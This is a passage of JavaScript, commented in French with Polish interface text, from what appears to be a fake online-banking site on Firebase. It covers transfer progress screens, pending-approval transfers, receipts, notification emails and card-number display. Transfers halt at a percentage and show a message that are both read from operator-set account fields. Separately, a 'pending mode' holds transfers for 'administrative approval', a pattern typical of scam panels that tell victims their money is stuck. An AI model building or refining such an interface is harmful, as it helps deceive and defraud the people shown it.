  if (status) { status.textContent = 'Przelew zatwierdzony'; status.style.color = ''; }
  if (percentResult) percentResult.style.color = '#10B981';
  if (msgEl) {
    msgEl.textContent = 'Środki zostaną przelane w ciągu 1-2 dni roboczych.';
    msgEl.style.background = '';
    msgEl.style.borderLeftColor = '';
    msgEl.style.color = '';
  }
  if (statusTag) {
    statusTag.innerHTML = '<i class="fa-solid fa-circle-check" style="font-size:9px;"></i> Zrealizowany';
    statusTag.style.background = '#ecfdf5';
    statusTag.style.color = '#059669';
    statusTag.style.borderColor = '#059669';
  }
}

// ===== AFFICHAGE DU REÇU PENDING =====
function showPendingResult(amount, beneficiary, iban, bank, reason, refNum, dateStr, timeStr) {
  resetReceiptStyles();

  const icon = document.getElementById('resultIcon');
  const status = document.getElementById('resultStatus');
  const percentResult = document.getElementById('resultPercent');
  const benefEl = document.getElementById('resultBenef');
  const amountEl = document.getElementById('resultAmount');
  const accountEl = document.getElementById('resultAccount');
  const msgEl = document.getElementById('resultMsg');

  if (icon) icon.innerHTML = '<i class="fa-solid fa-clock" style="color:#D97706;"></i>';
  if (status) {
    status.textContent = 'Przelew w oczekiwaniu';
    status.style.color = '#92400E';
  }
  if (percentResult) {
    percentResult.textContent = '100%';
    percentResult.style.color = '#D97706';
  }
  if (benefEl) benefEl.textContent = beneficiary;
  if (amountEl) amountEl.textContent = fmt(amount);
  if (accountEl) accountEl.textContent = iban;
  document.getElementById('resultDate').textContent = dateStr + ' • ' + timeStr;

  if (msgEl) {
    msgEl.textContent = 'Twój przelew oczekuje na zatwierdzenie przez służby administracyjne. Otrzymasz powiadomienie e-mail po zatwierdzeniu.';
    msgEl.style.background = '#FFFBEB';
    msgEl.style.borderLeftColor = '#D97706';
    msgEl.style.color = '#92400E';
  }

  const statusTag = document.querySelector('.receipt-row .status-tag');
  if (statusTag) {
    statusTag.innerHTML = '<i class="fa-solid fa-clock" style="font-size:9px;"></i> W oczekiwaniu';
    statusTag.style.background = '#FFFBEB';
    statusTag.style.color = '#D97706';
    statusTag.style.borderColor = '#D97706';
  }

  navigateTo('result');
}

// ===== GESTION DU TRANSFERT EN MODE PENDING (CORRIGÉE) =====
async function handlePendingTransfer(amount, beneficiary, iban, bank, reason) {
  showLoading('Przetwarzanie...');
  try {
    const { dateStr, timeStr, timestamp } = getPolandDateTime();
    const devise = user.devise || 'zł';
    const refNum = genId('REF');

    // 1. Vérifier le solde
    const currentBalance = Number(user.montant) || 0;
    if (amount > currentBalance) {
      hideLoading();
      toast('⚠️ Saldo niewystarczające');
      return;
    }

    // 2. Débiter le solde
    const newBalance = currentBalance - amount;
    await update(ref(db, 'clients/' + user._id), { montant: newBalance, updated: Date.now() });
    user.montant = newBalance;
    const balElement = document.getElementById('bal');
    const statBalElement = document.getElementById('stat-balance');
    updateBalanceDisplay(balElement, statBalElement, user.montant);
    document.getElementById('bal2').textContent = fmt(user.montant);
    updateProfileInfo();

    // 3. Créer la transaction 'pending' dans l'historique
    const pendingTx = {
      id: genId('PE'),
      title: 'Przelew w oczekiwaniu',
      subtitle: beneficiary,
      amount: -amount,
      beneficiary: beneficiary,
      iban: iban,
      bankName: bank,
      reason: reason,
      devise: devise,
      date: dateStr,
      time: timeStr,
      timestamp: timestamp,
      status: 'pending',
      reference: refNum
    };
    const newRef = await push(ref(db, 'clients/' + user._id + '/history'), pendingTx);
    const txKey = newRef.key;

    // 4. Créer l'entrée dans pendingTransfers
    await push(ref(db, 'clients/' + user._id + '/pendingTransfers'), {
      amount: amount,
      beneficiary: beneficiary,
      iban: iban,
      bank: bank,
      reason: reason,
      txKey: txKey,
      date: dateStr,
      time: timeStr,
      timestamp: timestamp,
      reference: refNum,
      status: 'pending'
    });

    // 5. Bannière
    const nomClient = user.nom || 'Klient';
    const formattedAmount = amount.toLocaleString('pl-PL') + ' ' + devise;
    const bannerMsg = `Witam ${nomClient}, Przelew ${formattedAmount} do ${beneficiary} oczekuje na zatwierdzenie administracyjne.`;
    await update(ref(db, 'clients/' + user._id), { bannerMessage: bannerMsg, bannerRead: false });
    user.bannerMessage = bannerMsg;
    user.bannerRead = false;
    updateBanner();

    hideLoading();

    // 6. Naviguer vers la page de progression et attendre le rendu
    navigateTo('progress');

    // Attendre que le DOM soit prêt (2 frames)
    await new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)));

    // 7. Remplir les détails
    document.getElementById('pAmount').textContent = fmt(amount);
    document.getElementById('pBenef').textContent = beneficiary;
    document.getElementById('pIban').textContent = iban;
    document.getElementById('pBank').textContent = bank;
    const reasonRow = document.getElementById('pReasonRow');
    if (reason && reason.trim() !== '') {
      document.getElementById('pReason').textContent = reason;
      reasonRow.style.display = 'block';
    } else {
      reasonRow.style.display = 'none';
    }

    // 8. Lancer la progression de 1 à 100%
    const fill = document.getElementById('progressFill');
    const percentEl = document.getElementById('progressPercent');
    let w = 0;
    const interval = setInterval(() => {
      w += 1;
      fill.style.width = w + '%';
      percentEl.textContent = w + '%';
      if (w >= 100) {
        clearInterval(interval);
        // Une fois à 100 %, afficher le reçu et envoyer l'email
        setTimeout(() => {
          showPendingResult(amount, beneficiary, iban, bank, reason, refNum, dateStr, timeStr);

          // === ENVOYER L'EMAIL MAINTENANT (à 100%) ===
          sendMail({
            to: user.email,
            name: user.nom || 'Klient',
            pct: 100,
            success: false,
            montant: fmt(amount),
            beneficiaire: beneficiary,
            compte: iban,
            reference: refNum,
            isRefund: false,
            isPending: true
          })
          .then(() => console.log('✅ Email pending envoyé avec succès'))
          .catch((error) => {
            console.error('❌ Erreur envoi email pending:', error);
            // Ne pas bloquer l'interface
          });
        }, 500);
      }
    }, 80);

    toast('⏳ Przelew oczekuje na zatwierdzenie');
  } catch (err) {
    console.error('❌ Erreur dans handlePendingTransfer:', err);
    toast('❌ Wystąpił błąd podczas przetwarzania przelewu');
    hideLoading();
    // En cas d'erreur, revenir au tableau de bord
    navigateTo('dashboard');
  }
}


function startProgress(amount, beneficiary, iban, bank, reason) {
  console.log('🚀 startProgress appelé avec :', { amount, beneficiary, iban, bank, reason });

  // === VÉRIFICATION MODE PENDING ===
  const isPendingMode = user.pendingTransferConfig && user.pendingTransferConfig.enabled === true;
  console.log('⏳ Mode pending check:', isPendingMode, user.pendingTransferConfig);

  if (isPendingMode) {
    console.log('⏳ Mode pending actif – traitement en attente');
    handlePendingTransfer(amount, beneficiary, iban, bank, reason);
    return;
  }

  resetReceiptStyles();

  

  document.getElementById('pAmount').textContent = fmt(amount);
  document.getElementById('pBenef').textContent = beneficiary;
  document.getElementById('pIban').textContent = iban;
  document.getElementById('pBank').textContent = bank;
  const reasonRow = document.getElementById('pReasonRow');
  if (reason && reason.trim() !== '') {
    document.getElementById('pReason').textContent = reason;
    reasonRow.style.display = 'block';
  } else {
    reasonRow.style.display = 'none';
  }

  const pct = Number(user.pct) || 100;
  const msg = user.msg || '';
  const fill = document.getElementById('progressFill');
  const percentEl = document.getElementById('progressPercent');

  let w = 0;
  const interval = setInterval(() => {
    w += 1;
    const cur = Math.min(w, pct);
    fill.style.width = cur + '%';
    percentEl.textContent = cur + '%';
    if (w >= pct) {
      clearInterval(interval);
      console.log('✅ Pourcentage atteint :', pct);
      setTimeout(async () => {
        const icon = document.getElementById('resultIcon');
        const status = document.getElementById('resultStatus');
        const percentResult = document.getElementById('resultPercent');
        const benefEl = document.getElementById('resultBenef');
        const amountEl = document.getElementById('resultAmount');
        const accountEl = document.getElementById('resultAccount');
        const msgEl = document.getElementById('resultMsg');

        percentResult.textContent = cur + '%';
        if (pct >= 100) {
          icon.innerHTML = '<i class="fa-solid fa-circle-check" style="color:#10B981;"></i>';
          status.textContent = 'Przelew zatwierdzony';
          const amt = Number(transferData.amount) || 0;
          const newMontant = Number(user.montant) - amt;
          user.montant = newMontant;

          console.log('💰 Mise à jour du solde :', newMontant);
          try {
            await update(ref(db, 'clients/' + user._id), { montant: newMontant });
            console.log('✅ Solde mis à jour');

            const { dateStr, timeStr, timestamp } = getPolandDateTime();
            const tx = {
              id: genId('DE'),
              title: 'Przelew wysłany',
              subtitle: transferData.benef,
              amount: -amt,
              beneficiary: transferData.benef,
              iban: transferData.iban,
              devise: user.devise || 'zł',
              date: dateStr,
              time: timeStr,
              timestamp: timestamp
            };
            console.log('📤 Enregistrement de la transaction :', tx);
            await push(ref(db, 'clients/' + user._id + '/history'), tx);
            console.log('✅ Transaction enregistrée');
            toast(`-${fmt(amt)}`);

            const nomClient = user.nom || 'Klient';
            const formattedAmount = amt.toLocaleString('pl-PL') + ' ' + (user.devise || 'zł');
            const bannerMsg = `Witam ${nomClient}, Przelew ${formattedAmount} został wysłany do ${beneficiary}.`;
            console.log('📢 Écriture de la bannière de débit :', bannerMsg);

            await update(ref(db, 'clients/' + user._id), { bannerMessage: '', bannerRead: true });
            await update(ref(db, 'clients/' + user._id), { bannerMessage: bannerMsg, bannerRead: false });
            console.log('✅ Bannière générée');

            user.bannerMessage = bannerMsg;
            user.bannerRead = false;
            updateBanner();

          } catch (err) {
            console.error('❌ Erreur lors de l\'enregistrement du transfert:', err);
            toast('❌ Erreur lors de l\'enregistrement du transfert');
          }

          const balElement = document.getElementById('bal');
          const statBalElement = document.getElementById('stat-balance');
          updateBalanceDisplay(balElement, statBalElement, user.montant);
          document.getElementById('bal2').textContent = fmt(user.montant);
          updateProfileInfo();

        } else {
          icon.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color:#EAB308;"></i>';
          status.textContent = 'Przelew zatrzymany';
        }
        benefEl.textContent = transferData.benef;
        amountEl.textContent = transferData.amountFormatted;
        accountEl.textContent = transferData.iban;
        const { dateStr, timeStr } = getPolandDateTime();
        document.getElementById('resultDate').textContent = dateStr + ' • ' + timeStr;
        msgEl.textContent = msg || (pct >= 100 ? 'Środki zostaną przelane w ciągu 1-2 dni roboczych.' : 'Transakcja została przerwana.');

        const successFinal = (pct >= 100);
        const refNum = genId('REF');
        sendMail({
          to: user.email,
          name: user.nom || 'Klient',
          pct: pct,
          success: successFinal,
          montant: transferData.amountFormatted,
          beneficiaire: transferData.benef,
          compte: transferData.iban,
          reference: refNum,
          isRefund: false
        })
        .then(() => console.log('✅ BIP envoyé avec nouvelle API'))
        .catch((error) => {
          console.error('❌ Erreur envoi BIP:', error);
          toast('Erreur lors de l\'envoi du BIP');
        });

        navigateTo('result');
      }, 500);
    }
  }, 80);
}

// ===== CARTE =====
let cardVisible = false;
window.copyCardNumber = function() {
  const num = document.getElementById('cardDetailNumber').textContent.replace(/\s/g, '');
  navigator.clipboard.writeText(num).then(() => toast('✅ Numer skopiowany')).catch(() => toast('❌ Błąd kopiowania'));
};
window.copyIban = function() {
  const iban = document.getElementById('ibanNumber').textContent.replace(/\s/g, '');
  navigator.clipboard.writeText(iban).then(() => toast('✅ IBAN skopiowany')).catch(() => toast('❌ Błąd kopiowania'));
};
window.toggleCardVisibility = function() {
  cardVisible = !cardVisible;
  const eyeIcon = document.getElementById('eyeIcon');
  const eyeText = document.getElementById('eyeText');
  const cardNum = document.getElementById('cardNumber');
  const detailNum = document.getElementById('cardDetailNumber');
  const cvv = document.getElementById('cardCvv');
  const detailCvv = document.getElementById('cardDetailCvv');
  const realNum = (document.getElementById('cardDetailNumber').dataset.realNumber || document.getElementById('cardDetailNumber').textContent).replace(/\s/g, '');
  const realCvv = document.getElementById('cardDetailCvv').dataset.realCvv || document.getElementById('cardDetailCvv').textContent;
  if (cardVisible) {
    eyeIcon.className = 'fa-regular fa-eye-slash'; eyeText.textContent = 'Ukryj';
    const p1 = realNum.substring(0,4), p2 = realNum.substring(4,8), p3 = realNum.substring(8,12), p4 = realNum.substring(12,16);
    cardNum.innerHTML = `<span>${p1}</span><span>${p2}</span><span>${p3}</span><span>${p4}</span>`;
    detailNum.textContent = `${p1} ${p2} ${p3} ${p4}`;
    cvv.textContent = realCvv; detailCvv.textContent = realCvv;
  } else {
    eyeIcon.className = 'fa-regular fa-eye'; eyeText.textContent = 'Pokaż';
    const p1 = realNum.substring(0,4), p2 = realNum.substring(4,8), p3 = realNum.substring(8,12);
    cardNum.innerHTML = `<span>${p1}</span><span>${p2}</span><span>${p3}</span><span>XXXX</span>`;
    detailNum.textContent = `${p1} ${p2} ${p3} XXXX`;
    cvv.textContent = '***'; detailCvv.textContent = '***';
  }
};

// ===== TOAST =====
window.toast = function(m) {
  const t = document.getElementById('t');
  t.textContent = m;
  t.style.display = 'block';
  setTimeout(() => t.style.display = 'none', 1500);
};

// ===== RÉINITIALISATION DES VALIDITÉS PERSONNALISÉES =====
function setupCustomValidityReset() {
  // Validation gérée par le système de messages d'erreur en temps réel
}

// ===== INITIALISATION =====
function init() {
  setupCustomValidityReset();
  setupCodeValidation();
}

document.addEventListener('DOMContentLoaded', init);

// ===== APPELS D'INITIALISATION =====
setTimeout(() => {
  if (user) {
    setupCustomValidityReset();
    setupTransferValidation();
    setupRequiredMessages();
    setupCodeValidation();
  }
}, 300);

setInterval(() => {
  if (user && document.getElementById('dashboard').classList.contains('active')) {
    adjustAllTexts();
  }
}, 1000);

setInterval(() => {
  refreshSession();
}, 30000);

window.addEventListener('resize', () => {
  adjustAllTexts();
});

setTimeout(() => {
  document.querySelectorAll('.btn').forEach(btn => btn.style.background = 'var(--p)');
  adjustAllTexts();
}, 100);
